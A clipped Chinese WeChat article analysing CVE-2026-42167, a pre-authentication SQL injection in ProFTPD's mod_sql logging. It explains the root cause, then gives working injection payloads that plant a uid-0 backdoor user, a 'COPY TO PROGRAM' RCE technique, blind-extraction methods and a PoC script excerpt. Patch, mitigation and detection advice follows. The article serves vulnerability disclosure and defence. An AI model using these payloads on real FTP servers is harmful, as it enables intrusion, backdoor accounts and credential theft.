---
title: 【微信】FTP一条USER拿整个文件系统
source: https://mp.weixin.qq.com/s/St8D_a_IzqsPh4fy_7IXVw
source_host: mp.weixin.qq.com
clip_date: 2026-10-05T09:38:25+08:00
trace_id: e8465889-e897-407f-ab52-83f5b0c27fe7
content_hash: 97d1300ef69123bf354409acb7936a8277d5dd7efbb78662dbfb62bcdc5f03f7
status: synced
tags:
  - 微信
  - 漏洞分析
  - 协议分析
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: 一条 `USER` 命令即可在 ProFTPD mod_sql 日志中触发预认证 SQL 注入（CVE-2026-42167），绕过认证并可能拿下整个文件系统。
ai_summary_style: key-points
images_status:
  total: 3
  succeeded: 3
  failed_urls: []
notion_page_id: 3f075244-d011-81bb-b72b-c9f3af689f0b
ioc:
  cves:
    - CVE-2026-42167
  cwes: []
  hashes:
    - af90843baf7dcb8c6be1e5261be2d0b5b5850673
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 一条 `USER` 命令即可在 ProFTPD mod_sql 日志中触发预认证 SQL 注入（CVE-2026-42167），绕过认证并可能拿下整个文件系统。
> 
> - **根因：** `is_escaped_text()` 只看字符串首尾是否为单引号、内部有无单引号，判定为"已转义"就完全跳过 `sql_escapestring()`，攻击者可自行构造 `'xxx'` 形式 100% 绕过。
> - **触发条件：** ProFTPD ≤1.3.9 + 启用 mod_sql 日志 + 日志语句使用 `%U`/`%f` 等攻击者可控变量；`%U` 为认证前设置的原始 USER 名，`SQLLog ERR_*` 使登录失败也会触发 INSERT。
> - **利用方式：** 发送 `USER ' || (SELECT 1) ||'` 即可注入；PostgreSQL/SQLite 下可用 `;` 堆叠语句，配合美元符引用 `$$` 避免 payload 内出现单引号，插入后门用户后以 `uid=0`、homedir=`/` 登录。
> - **四类危害：** 认证绕过+提权、PG 主机 RCE（`COPY TO PROGRAM`）、`pg_sleep()` 时序盲注拖库、`mod_quotatab_sql` 配额逃逸；Shodan 可见约 16 万实例，估算≥1% 预认证可利用。
> - **修复与缓解：** 升级至 1.3.9a（commit `af90843baf7dcb8c6be1e5261be2d0b5b5850673`）；临时可注释全部 `SQLLog` 关闭日志，并监控 SQL INSERT 异常与 `COPY TO PROGRAM` 调用。

**黑白之道** *2026年10月5日 09:12*

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/eeb836fa6d77631e.png)

> **导语**：ZeroPath Research 近日披露 ProFTPD（专业的 FTP 服务器程序） mod_sql 日志管线里的"已转义"启发式缺陷——编号 **CVE-2026-42167**，CVSS（通用漏洞评分系统） 8.1。攻击者只需发一个 `USER` 命令，连密码都不用输，就能在 SQL 日志 INSERT 里堆叠任意语句。Shodan 上能看到的 16 万公开实例里，估算至少 1% 是预认证可打的。本文拆这条链，附官方 PoC（概念验证代码）。

* * *

## 一、漏洞一句话

ProFTPD 1.3.9 及以下 + 启用了 mod_sql 日志 + 日志语句用 `%U` / `%f` 这类攻击者可控变量 → **预认证 SQL 注入**。

修复版本：1.3.9a（commit `af90843baf7dcb8c6be1e5261be2d0b5b5850673` ）。

## 二、根因：is_escaped_text() 这个"自欺欺人"的判定

漏洞点在 `contrib/mod_sql.c` 的两段紧挨着的代码里。

第一段是判定函数，逻辑就是"看起来像已转义的字符串就跳过转义"：

```objectivec
static int is_escaped_text(const char *text, size_t text_len) {
    if (text[0] != '\'')            return FALSE;
    if (text[text_len-1] != '\'')   return FALSE;
    for (i = 1; i < text_len-1; i++)
        if (text[i] == '\'')        return FALSE;
    return TRUE;
}
```

第二段是写入处—— `is_escaped_text()` 返回 TRUE 就 **完全跳过 `sql_escapestring()`**：

```objectivec
if (is_escaped_text(text, text_len) == FALSE) {
    /* 这里才会做真正的 SQL 转义 */
} else {
    pr_trace_msg(trace_channel, 17,
        "text '%s' is already escaped, skipping escaping it again", text);
    new_text = (char *)text;   // ← 原样送进 query
    new_textlen = text_len;
}
```

作者本意是处理"上游已经把值拼成 `'foo'` 这种形式"的场景，但攻击者只需要自己把值也写成 `'xxx'` 的形式就能 100% 绕过——这是个 **纯语法层、可被攻击者伪造** 的判定。

![is\_escaped\_text() 绕过链路](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/4c0146dce866c4b3.png "is_escaped_text() 绕过链路")

## 三、攻击链：FTP USER 名 → SQL INSERT

ProFTPD 默认的 mod_sql 日志配置长这样：

```
SQLNamedQuery log_activity INSERT "'%U', '%r', '%m'" activity_log
SQLLog        *           log_activity
SQLLog        ERR_*       log_activity
```

`%U` 是"原始 USER 名"， **认证前就设好了**； `%r` 是完整 FTP 命令； `%m` 是 FTP 动词。 `SQLLog ERR_*` 的意思是"失败命令触发"——意味着 **用户登录失败都会触发一次 INSERT**。

攻击者只要发：

```
USER ' || (SELECT 1) ||'
```

替换进去，原语句变成：

```sql
INSERT '' || (SELECT 1) || '', '<完整命令>', '<动词>'  INTO activity_log
```

——也就是"插一个空串拼上子查询拼上空串"。判定函数看到首尾是单引号、中间没有单引号， **直接放行**。

更狠的玩法是堆叠（PostgreSQL/SQLite 支持 `;` 分隔的 SQL 语句，MySQL 默认不行）：

```
USER ', null, null); INSERT INTO users VALUES($$backdoor$$, $$pwned123$$, 0, 0, $$/$$, $$/bin/bash$$); --'
```

美元符 \`\` 是 PostgreSQL 的美元符引用语法，避免 payload 内部出现单引号。注入后，攻击者直接以 \`backdoor / pwned123\` 登录，拿到 \`uid=0\`、\`homedir=/\` 的 FTP 访问权——\*\*等于直接拥有整个文件系统\*\*。

## 四、实际危害：RCE / 认证绕过 / 凭据提取 / 配额逃逸

ZeroPath 把利用分四个场景，前两个杀伤力最大：

| 场景  | 触发条件 | 影响  |
| --- | --- | --- |
| **认证绕过 + 提权** | mod_sql 启用了 `SQLAuthenticate users` | 堆叠 INSERT 后门用户，登录即得全盘 |
| **RCE（PostgreSQL 主机）** | ProFTPD 用 PG 超级用户连库 | `COPY (SELECT 1) TO PROGRAM 'cmd'`<br><br>在 DB 主机执行任意命令 |
| **凭据盲注** | 任意能注入的部署 | 用 `pg_sleep()` 做时序盲注（一种通过响应延迟逐字符提取数据的攻击手法），把 `users` 表里明文/哈希密码全抽走 |
| **配额逃逸** | 启用了 `mod_quotatab_sql` | 直接 UPDATE（修改）配额表绕过限制 |

RCE 的原理是 PostgreSQL 的 `COPY TO PROGRAM` ：把子查询结果交给 shell 命令处理。ZeroPath 在 PoC 里就演示了这一招——PostgreSQL 主机被 ProFTPD DB 角色跑成什么用户，攻击者就拿到什么 shell。

## 五、PoC：5 个脚本，覆盖预认证/认证后/盲注三种路径

官方 PoC 仓库在 github.com/ZeroPathAI/proftpd-CVE-2026-42167-poc，全部用 Python 标准库， **没有第三方依赖**：

| 文件  | 触发变量 | 危害  | 所需权限 |
| --- | --- | --- | --- |
| `pocs/preauth_user_backdoor.py` | `%U`<br><br>（USER 命令） | 植入后门用户 | 仅网络可达 |
| `pocs/preauth_user_rce.py` | `%U` | PG 主机 RCE | 仅网络可达 + PG 超级用户 |
| `pocs/postauth_stor_backdoor.py` | `%{basename}`<br><br>（STOR 文件名） | 植入后门用户 | 任意 FTP 账号（匿名通杀） |
| `pocs/postauth_stor_rce.py` | `%{basename}` | PG 主机 RCE | 任意 FTP 账号 + PG 超级用户 |
| `pocs/postgres_blind_dump.py` | `%U` | 盲注抽 users 表 | 仅网络可达 + 最小 INSERT 权限 |

预认证后门注入的核心代码就这一段（精简自 `preauth_user_backdoor.py` ）：

```powershell
payload = (
    "', null, null); "
    "INSERT INTO users VALUES("
    "$$backdoor$$, $$pwned123$$, 0, 0, $$/$$, $$/bin/bash$$"
    "); --'"
)
# 验证 payload 满足 is_escaped_text() 的判定（首尾单引号、内部无单引号）
assert payload[0] == "'"and payload[-1] == "'"and"'"notin payload[1:-1]

# 发送 USER 命令触发注入；登录肯定失败（密码是乱填的），但 ERR_* 日志会先命中
ftp_cmd(host, port, [f"USER {payload}", "PASS x", "QUIT"])

# 等日志 INSERT 落库后，用植入的用户名+密码正式登录
ftp_cmd(host, port, ["USER backdoor", "PASS pwned123", "PWD", "QUIT"])
# 成功的话 PWD 返回 "/"，说明 homedir 是根目录
```

完整跑法：

```bash
git clone https://github.com/ZeroPathAI/proftpd-CVE-2026-42167-poc
cd proftpd-CVE-2026-42167-poc
cd setup
./setup.sh      # 自动起 Docker（ProFTPD + PostgreSQL + 种子数据）
# 跟着脚本打印的提示跑 PoC
uv run --no-project ../pocs/preauth_user_backdoor.py --host 127.0.0.1 --port 2121
```

`setup.sh` 会把 ProFTPD 源码拉到本地、用 `--with-modules=mod_sql:mod_sql_postgres` 编译，再起容器——第一次跑要 2-3 分钟，之后直接秒级复用。

## 六、修复与缓解

-   **必须升级**：1.3.9a（commit `af90843baf7dcb8c6be1e5261be2d0b5b5850673` ）。
    
-   **临时缓解**：关掉 `mod_sql` 日志（ `SQLLog` 全部注释）。
    
-   **检测**：盯着 ProFTPD 日志里 SQL INSERT 失败/异常的请求；监控 PostgreSQL 的 `COPY TO PROGRAM` 调用。
    
-   **审计**：所有 `mod_sql` 依赖的功能（认证、配额、ban 名单）都默认已被污染，复查数据库内容。
    

## 七、给红队/蓝队的几点启示

1.  **"已转义"启发式是反模式**。任何"看起来像 X 就跳过 X"的优化，都会被攻击者伪造。安全判定只能基于真实可信源，而不是值的形状。
    
2.  **配置依赖型漏洞最难找**。这条链要 mod_sql 启用 + 日志启用 + 特定变量组合才会触发，静态分析器很容易漏；ZeroPath 用了 LLM 辅助才把"语义层的意图错误"挖出来。
    
3.  **`%U` 是认证前的关键 sink（数据汇聚点）**。所有 FTP 服务里这种"认证前就解析的输入"都要审计——不只是 ProFTPD，vsftpd、FileZilla Server、Pure-FTPd 都得过一遍。
    
4.  **PoC 用美元符引用避免 payload 内单引号**。这是 PostgreSQL payload 的标准技巧，写注入工具的时候直接抄。
    

* * *

**官方 PoC 仓库**：github.com/ZeroPathAI/proftpd-CVE-2026-42167-poc（5 个 Python 脚本 + Docker 一键环境）

**技术原文**：ZeroPath Research · CVE-2026-42167 Allows Auth Bypass And RCE In ProFTPD

**补丁 commit**：af90843

**CVE 详情**：CVE-2026-42167

* * *

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/60693bec6dc25202.jpg)

> 👇 点击，访问我的网站

* * *

漏洞专题 · 目录
